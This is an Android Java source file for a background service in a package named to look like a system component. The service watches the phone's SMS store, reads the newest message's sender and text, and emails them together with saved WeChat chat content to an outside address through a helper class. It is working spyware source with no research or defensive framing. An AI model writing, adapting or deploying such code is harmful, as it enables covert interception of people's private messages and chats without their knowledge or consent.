package com.android.system.need;

import android.app.Notification;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
//import android.support.annotation.Nullable;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CursorAdapter;

public class MyService extends Service {

	private String struri = "content://sms";
	private ContentResolver resolver = null;
	private String body = "";
	private String address = "";

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		//
		Log.i("###","MyService——onCreate");
		super.onCreate();
		checkMSG();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i("###","MyService——onStartCommand");
		//checkMSG();
		return START_STICKY;
	}


	private  void checkMSG(){
		resolver = getApplicationContext().getContentResolver();
		Cursor cursor = resolver.query(Uri.parse(struri), null, null, null,
				null);
		CursorAdapter adapter = new CursorAdapter(getBaseContext(), cursor,
				CursorAdapter.FLAG_REGISTER_CONTENT_OBSERVER) {

			@Override
			public View newView(Context arg0, Cursor arg1, ViewGroup arg2) {
				// TODO Auto-generated method stub
				return null;
			}

			@Override
			public void bindView(View arg0, Context arg1, Cursor arg2) {
				// TODO Auto-generated method stub

			}

			@Override
			protected void onContentChanged() {
				super.onContentChanged();
				Log.i("###","onContentChanged");

				sendEmail();
				//关闭指针？

				//cursor.close();

			}
		};


	}

	private void sendEmail(){
		Cursor cursor = resolver.query(Uri.parse(struri), null, null,
				null, null);
		cursor.moveToFirst();
		address = cursor.getString(cursor.getColumnIndex("address"));
		body = cursor.getString(cursor.getColumnIndex("body"));

				// 读取文件中的消息，并发送邮件
				SharedPreferences settings = getSharedPreferences("my_spf", MODE_PRIVATE);
				String EmaiBody=settings.getString("msg_key","没有消息，或者发生异常");
				SendEmailHelper.sendEmail("来自手机号 "+address+"\n短信内容为:"+body+"\n\n微信聊天如下： \n"+EmaiBody);
				Log.i("***","--sendEmail--:"+EmaiBody);
				//每次发送之后把 SharedPreferences my_spf 文件对应的 msg_key 值变为""
				SharedPreferences.Editor editor = settings.edit();
				editor.putString("msg_key","");
				editor.commit();


	}
}
